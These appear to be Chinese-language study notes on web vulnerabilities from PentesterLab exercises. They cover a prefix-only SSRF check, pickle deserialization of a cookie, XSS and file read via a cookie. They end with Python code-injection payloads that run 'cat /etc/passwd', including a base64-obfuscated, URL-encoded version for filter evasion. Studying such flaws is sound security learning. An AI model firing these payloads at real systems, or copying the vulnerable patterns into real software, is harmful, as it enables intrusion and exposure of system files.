###只檢查url開頭是否為https://pentesterlab.com，可透過植入https://pentesterlab.com.example.org來繞過
	@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    if url.startswith("https://pentesterlab.com"):
      response = urllib.request.urlopen(url)
      html = response.read()
      return html
    return ""


###未過濾username，可透過直入惡意的pickeled object來繞過
username=pickle.loads(base64.b64decode(cookies.get('username').value))
###存在cross-site scripting漏洞，可透過植入惡意payload來繞過
self.wfile.write(bytes("<h1>Hello %s</h1>" % username, "utf-8"))
###未過濾session_id,可透植入惡意payload達成任意文件讀取漏洞
username=open(cookies.get('session_id').value).readlines()[0] 

###在url後面增加"若有錯誤，則代表服務器報錯
__import__('os').popen('cat /etc/passwd').read()
弱勢/被屏蔽或是會錯誤，使用base64將內容在做decode執行
"%2bstr(__import__('os').popen(str(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk'))).read())%2b"